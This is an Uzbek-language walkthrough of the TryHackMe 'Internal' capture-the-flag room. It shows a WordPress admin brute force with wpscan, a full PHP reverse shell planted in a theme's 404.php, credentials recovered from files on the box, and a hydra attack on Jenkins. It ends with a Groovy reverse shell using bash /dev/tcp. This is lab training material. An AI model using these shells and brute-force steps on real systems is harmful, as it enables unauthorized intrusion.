# Internal

Room: https://tryhackme.com/room/internal

Boshlashdan oldin:

```
echo "10.10.122.172 internal.thm" >> /etc/hosts
```




## Doimgidek ish razvetkadan

```
╭─mete   󰉖 ~
╰─ ❯❯ rustscan -a 10.10.122.172 -- -sV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Open ports, closed hearts.

[~] The config file is expected to be at "/home/mete/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.122.172:22
Open 10.10.122.172:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -sV" on ip 10.10.122.172
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-11 21:44 +05
NSE: Loaded 47 scripts for scanning.
Initiating Ping Scan at 21:44
Scanning 10.10.122.172 [2 ports]
Completed Ping Scan at 21:44, 0.12s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 21:44
Completed Parallel DNS resolution of 1 host. at 21:44, 0.03s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 3, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 21:44
Scanning 10.10.122.172 [2 ports]
Discovered open port 80/tcp on 10.10.122.172
Discovered open port 22/tcp on 10.10.122.172
Completed Connect Scan at 21:44, 0.54s elapsed (2 total ports)
Initiating Service scan at 21:44
Scanning 2 services on 10.10.122.172
Completed Service scan at 21:44, 6.28s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.122.172.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 21:44
Completed NSE at 21:44, 0.88s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 21:44
Completed NSE at 21:44, 1.48s elapsed
Nmap scan report for 10.10.122.172
Host is up, received syn-ack (0.22s latency).
Scanned at 2025-06-11 21:44:06 +05 for 9s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.48 seconds
```

80 portga qiyo boqsak...

![](https://raw.githubusercontent.com/akhatkulov/Write-Ups/refs/heads/main/TryHackme/Pictures/internal_1.jpg)

Damn! Routinglarga qarasak.

```
╭─mete   󰉖 ~
╰─ ❯❯ fish
Welcome to fish, the friendly interactive shell
Type help for instructions on how to use fish
mete@sec ~> gobuster dir -u http://10.10.122.172/ -w=/usr/share/payloads/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.122.172/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/payloads/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/blog                 (Status: 301) [Size: 313] [--> http://10.10.122.172/blog/]
/wordpress            (Status: 301) [Size: 318] [--> http://10.10.122.172/wordpress/]
/javascript           (Status: 301) [Size: 319] [--> http://10.10.122.172/javascript/]
/phpmyadmin           (Status: 301) [Size: 319] [--> http://10.10.122.172/phpmyadmin/]
```

Bu endi boshqa gap)

Qanday texlagoyilar ishlatilgan ekan? **whatweb** dasturi yordamida aniqlaymiz.

```
╭─mete   󰉖 ~
╰─ ❯❯ whatweb http://10.10.122.172/blog/
http://10.10.122.172/blog/ [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.122.172], JQuery, MetaGenerator[WordPress 5.4.2], PoweredBy[WordPress], Script, Title[Internal &#8211; Just another WordPress site], UncommonHeaders[link], WordPress[5.4.2]

╭─mete   󰉖 ~
╰─ ❯❯ whatweb http://10.10.122.172/wordpress
http://10.10.122.172/wordpress [301 Moved Permanently] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.122.172], RedirectLocation[http://10.10.122.172/wordpress/], Title[301 Moved Permanently]
http://10.10.122.172/wordpress/ [404 Not Found] Apache[2.4.29], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.122.172], JQuery, MetaGenerator[WordPress 5.4.2], PoweredBy[WordPress], Script, Title[Page not found &#8211; Internal], UncommonHeaders[link], WordPress[5.4.2]

╭─mete   󰉖 ~
╰─ ❯❯ whatweb http://10.10.122.172/phpmyadmin
http://10.10.122.172/phpmyadmin [301 Moved Permanently] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.122.172], RedirectLocation[http://10.10.122.172/phpmyadmin/], Title[301 Moved Permanently]
http://10.10.122.172/phpmyadmin/ [200 OK] Apache[2.4.29], Content-Security-Policy[default-src 'self' ;options inline-script eval-script;referrer no-referrer;img-src 'self' data:  *.tile.openstreetmap.org;,default-src 'self' ;script-src 'self'  'unsafe-inline' 'unsafe-eval';referrer no-referrer;style-src 'self' 'unsafe-inline' ;img-src 'self' data:  *.tile.openstreetmap.org;], Cookies[phpMyAdmin,pmaCookieVer,pma_collation_connection,pma_lang], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], HttpOnly[phpMyAdmin,pmaCookieVer,pma_collation_connection,pma_lang], IP[10.10.122.172], JQuery[2.1.4], PasswordField[pma_password], Script[text/javascript], Title[phpMyAdmin], UncommonHeaders[x-ob_mode,content-security-policy,x-content-security-policy,x-webkit-csp,x-content-type-options,x-permitted-cross-domain-policies,x-robots-tag], X-Frame-Options[DENY], X-UA-Compatible[IE=Edge], X-XSS-Protection[1; mode=block], phpMyAdmin
```



Wordpress **5.4.2** versiyada ishlamoqda... Bu versiyada zaiflik bormikan?

Qidiramiz:

```
site:exploit-db.com wordpress 5.4.2
```

Natijalar:

https://www.exploit-db.com/exploits/18834
https://www.exploit-db.com/exploits/29290



Topilgan eksploitlar yordam bermadi....



**Jinja(Beksulton) akamizdan:**

```
(ninja㉿kali)-[~]
└─$ wpscan --url http://internal.thm/blog -U admin --passwords /usr/share/wordlists/rockyou.txt
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://internal.thm/blog/ [10.10.161.58]
[+] Started: Wed Jun 11 21:49:08 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://internal.thm/blog/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://internal.thm/blog/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://internal.thm/blog/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://internal.thm/blog/index.php/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>
 |  - http://internal.thm/blog/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://internal.thm/blog/wp-content/themes/twentyseventeen/
 | Last Updated: 2025-04-15T00:00:00.000Z
 | Readme: http://internal.thm/blog/wp-content/themes/twentyseventeen/readme.txt
 | [!] The version is out of date, the latest version is 3.9
 | Style URL: http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 2.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507, Match: 'Version: 2.3'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:19 <=====> (137 / 137) 100.00% Time: 00:00:19

[i] No Config Backups Found.

[+] Performing password attack on Xmlrpc against 1 user/s
Trying admin / tequieromucho Time: 00:03:50 <> (1400 / 14344392)  0.00%  ETA: ??:??:Trying admin / jonasbrothers Time: 00:05:41 <> (2080 / 14344392)  0.01%  ETA: ??:??:Trying admin / avrillavigne Time: 00:07:30 <> (2665 / 14344392)  0.01%  ETA: ??:??:?[SUCCESS] - admin / my2boys                                                         
Trying admin / lizzy Time: 00:10:59 <      > (3885 / 14348277)  0.02%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: admin, Password: my2boys
 [!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Wed Jun 11 22:00:46 2025
[+] Requests Done: 4028
[+] Cached Requests: 35
[+] Data Sent: 2.033 MB
[+] Data Received: 2.311 MB
[+] Memory used: 292.387 MB
[+] Elapsed time: 00:11:37
```



> **Xulosa**: Wordpress admin paneli buzib kirildi va **credentials** quyidagilardan iborat:
>
> **Username:** admin
>
> **Password**: my2boys

**Admin Panel**: http://internal.thm/blog/wp-admin



![](https://raw.githubusercontent.com/akhatkulov/Write-Ups/refs/heads/main/TryHackme/Pictures/internal_2.jpg)

Kirib oldik.

![](https://raw.githubusercontent.com/akhatkulov/Write-Ups/refs/heads/main/TryHackme/Pictures/internal_3.jpg)

Wordpress faylini tahrirlaymiz. 404.php faylini o'rniga PHP reverse shell qo'yamiz.

PHP reverse shell:

```php
<?php

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.8.24.135';  // CHANGE THIS
$port = 4444;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0); 
	}

	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}


$descriptorspec = array(
   0 => array("pipe", "r"), 
   1 => array("pipe", "w"),  
   2 => array("pipe", "w") 
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 
```

Reverse shellni qabul qilish:

```
nc -nvln 4444
```

Reverse Shellni faollashtirish uchun ushbu PAGEga so'rov yuborov yuboramiz.

```
http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php
```

Natija:

```
mete@sec ~ [SIGINT]> nc -nvln 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.122.172 33602
Linux internal 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 17:21:16 up 39 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@internal:/$ whoami
whoami
www-data
www-data@internal:/$ 
```

TTY yaratib oldik)



Foydalunuvchilar:

```
www-data@internal:/tmp$ ls /home
ls /home
aubreanna
```

## Privilage Escalation

Doimigidek LinPeas.sh dasturi kerak.

Biroq Linpeas.sh'ga asoslangan izlanishlardan foyda chiqmadi. Biroq /opt papkasida...

```
www-data@internal:/tmp$ cd /opt
cd /opt
www-data@internal:/opt$ ls
ls
containerd  wp-save.txt
www-data@internal:/opt$ cat wp-save.txt
cat wp-save.txt
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:bubb13guM!@#123
www-data@internal:/opt$ 
```

Cyber Mikro: Bingo!



user.txt:

```
aubreanna@internal:~$ ls
jenkins.txt  snap  user.txt
aubreanna@internal:~$ cat user.txt
THM{ishla...}
```

jenkins.txt'ga nazar solsak:

```
aubreanna@internal:~$ cat jenkins.txt 
Internal Jenkins service is running on 172.17.0.2:8080
```

### Port Forwarding

```
ssh -L 8080:localhost:8080 aubreanna@internal.thm
```

![](https://raw.githubusercontent.com/akhatkulov/Write-Ups/refs/heads/main/TryHackme/Pictures/internal_4.jpg)

Qisqacha ma'lumot:

```
╭─mete   󰉖 ~/THM/THM-LABS/1106-2025                                                                                        
╰─ ❯❯ whatweb http://localhost:8080
http://localhost:8080 [403 Forbidden] Cookies[JSESSIONID.683a9866], Country[RESERVED][ZZ], HTTPServer[Jetty(9.4.30.v20200611)], HttpOnly[JSESSIONID.683a9866], IP[127.0.0.1], Jenkins[2.250], Jetty[9.4.30.v20200611], Meta-Refresh-Redirect[/login?from=%2F], Script, UncommonHeaders[x-content-type-options,x-hudson,x-jenkins,x-jenkins-session,x-hudson-cli-port,x-jenkins-cli-port,x-jenkins-cli2-port,x-you-are-authenticated-as,x-you-are-in-group-disabled,x-required-permission,x-permission-implied-by]
http://localhost:8080/login?from=%2F [200 OK] Cookies[JSESSIONID.683a9866], Country[RESERVED][ZZ], HTML5, HTTPServer[Jetty(9.4.30.v20200611)], HttpOnly[JSESSIONID.683a9866], IP[127.0.0.1], Jenkins[2.250], Jetty[9.4.30.v20200611], PasswordField[j_password], Script[text/javascript], Title[Sign in [Jenkins]], UncommonHeaders[x-content-type-options,x-hudson,x-jenkins,x-jenkins-session,x-hudson-cli-port,x-jenkins-cli-port,x-jenkins-cli2-port,x-instance-identity], X-Frame-Options[sameorigin]
```



Cyber Mikro:

Panelning login parolini topdi.

```
                                                                                                                                 ┌──(elliot㉿kali)-[~]
└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 http-post-form \
"/j_acegi_security_check:j_username=admin&j_password=^PASS^&from=%2F&Submit=Sign+in:loginError" \ 
-s 8080 -v
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-11 14:17:43
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://127.0.0.1:8080/j_acegi_security_check:j_username=admin&j_password=^PASS^&from=%2F&Submit=Sign+in:loginError
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done

[VERBOSE] Page redirected to http[s]://127.0.0.1:8080/
[8080][http-post-form] host: 127.0.0.1   login: admin   password: spongebob
[STATUS] attack finished for 127.0.0.1 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-11 14:18:38

```



Konsolga kirib olamiz.

![](https://raw.githubusercontent.com/akhatkulov/Write-Ups/refs/heads/main/TryHackme/Pictures/interal_5.jpg)

O'zlarini scriptlash tilida reverse shell joylaymiz.

![](https://raw.githubusercontent.com/akhatkulov/Write-Ups/refs/heads/main/TryHackme/Pictures/internal_6.jpg)

Reverse Shell:
```
def host = "10.8.24.135"
def port = 8888

String[] cmd = ["/bin/bash", "-c", "bash -i >& /dev/tcp/${host}/${port} 0>&1"]

Process p = Runtime.getRuntime().exec(cmd)
p.waitFor()
```


Natija:

```
mete@sec ~> nc -nvln 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.122.172 50136
bash: cannot set terminal process group (6): Inappropriate ioctl for device
bash: no job control in this shell
jenkins@jenkins:/$
```

/opt papkasini tekshiramiz...

```
jenkins@jenkins:/opt$ cat note.txt
cat note.txt
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
need access to the root user account.

root:tr0ub13guM!@#123
```



Va niyohat:

```
root@internal:~# cat root.txt
THM{ishla....}
```

